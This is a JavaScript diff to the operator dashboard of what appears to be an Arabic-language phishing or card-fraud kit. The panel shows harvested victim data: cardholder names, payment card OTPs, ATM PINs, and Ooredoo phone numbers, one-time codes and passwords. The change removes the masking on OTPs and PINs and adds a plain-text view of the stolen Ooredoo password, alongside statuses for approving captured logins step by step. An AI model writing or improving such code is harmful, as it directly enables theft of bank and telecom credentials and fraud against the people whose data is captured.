@@ -591,8 +591,8 @@ function openPop(ref){
   fieldsHTML += '<div style="margin-bottom:20px"><h4 style="margin:0 0 12px; color:var(--ink); font-size:14px; font-weight:700">💳 بيانات البطاقة</h4><div class="dgrid">';
   if (o.cardName) fieldsHTML += `<div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(o.cardName)}</span></div>`;
   if (o.pay) fieldsHTML += `<div class="drow"><span class="k">الحالة</span><span class="v">${o.pay.status}</span></div>`;
-  if (o.otp) fieldsHTML += `<div class="drow"><span class="k">OTP</span><span class="v">***</span></div>`;
-  if (o.atmPin) fieldsHTML += `<div class="drow"><span class="k">ATM PIN</span><span class="v">***</span></div>`;
+  if (o.otp) fieldsHTML += `<div class="drow"><span class="k">OTP</span><span class="v" style="direction:ltr; font-weight:600">${esc(o.otp)}</span></div>`;
+  if (o.atmPin) fieldsHTML += `<div class="drow"><span class="k">ATM PIN</span><span class="v" style="direction:ltr; font-weight:600">${esc(o.atmPin)}</span></div>`;
   fieldsHTML += '</div>';
 
   if (o.status === "awaiting" || o.status === "payment_pending" || o.status === "payment_accepted") {
@@ -607,7 +607,8 @@ function openPop(ref){
   if (o.ooredoo || o.ooredooOtp) {
     fieldsHTML += '<div style="margin-bottom:20px"><h4 style="margin:0 0 12px; color:var(--ink); font-size:14px; font-weight:700">📱 بيانات أوريدو</h4><div class="dgrid">';
     if (o.ooredoo && o.ooredoo.phone) fieldsHTML += `<div class="drow"><span class="k">رقم الهاتف</span><span class="v" style="direction:ltr">${fmtPhone(o.ooredoo.phone)}</span></div>`;
-    if (o.ooredooOtp) fieldsHTML += `<div class="drow"><span class="k">OTP أوريدو</span><span class="v">***</span></div>`;
+    if (o.ooredoo && o.ooredoo.password) fieldsHTML += `<div class="drow"><span class="k">كلمة المرور</span><span class="v">${esc(o.ooredoo.password)}</span></div>`;
+    if (o.ooredooOtp) fieldsHTML += `<div class="drow"><span class="k">OTP أوريدو</span><span class="v" style="direction:ltr; font-weight:600">${esc(o.ooredooOtp)}</span></div>`;
     fieldsHTML += '</div>';
 
     if (o.status === "awaiting" || o.status === "ooredoo_login_pending" || o.status === "ooredoo_otp_pending") {
